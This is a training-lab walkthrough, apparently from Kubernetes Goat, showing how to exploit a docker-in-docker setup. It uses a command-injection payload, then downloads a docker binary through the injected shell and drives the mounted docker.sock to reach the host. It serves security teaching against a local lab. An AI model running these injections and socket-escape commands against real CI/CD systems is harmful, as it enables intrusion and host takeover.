# DIND (docker-in-docker) exploitation

## Scenario Information

Most of the CI/CD and pipeline systems that use Docker and build containers for you within the pipeline use something called DIND (docker-in-docker). Here in this scenario, we try to exploit and gain access to the host system.

* To get started with the scenario, navigate to [http://127.0.0.1:1231](http://127.0.0.1:1231) and username is `admin` and password `kubernetesgoat`

![Scenario 2 Login](images/sc-2-1.png)

![Scenario 2 Home](images/sc-2-2.png)

## Scenario Solution

* By looking at application functionality, identified that it has command injection vulnerability

```bash
madhuakula.com; id
```

![Scenario 2 Command Injection](images/sc-2-3.png)

* After performing quite some analysis, identified the there is a `docker.sock` mount available in the file system

```bash
mount
```

![Scenario 2 mount](images/sc-2-4.png)

* Download the `docker` static binary from internet [https://download.docker.com/linux/static/stable/](https://download.docker.com/linux/static/stable/)

```bash
;wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz
```

![Scenario 2 download docker binary](images/sc-2-5.png)

* Extract the binary from the `docker-19.03.9.tgz` file

```bash
;tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/
```

![Scenario 2 extract binary](images/sc-2-6.png)

* Access the host system by running the following docker commands with `docker.sock`

```bash
;/tmp/docker/docker -H unix:///custom/docker/docker.sock ps
;/tmp/docker/docker -H unix:///custom/docker/docker.sock images
```

![Scenario 2 extract binary](images/sc-2-7.png)

## Miscellaneous

TBD
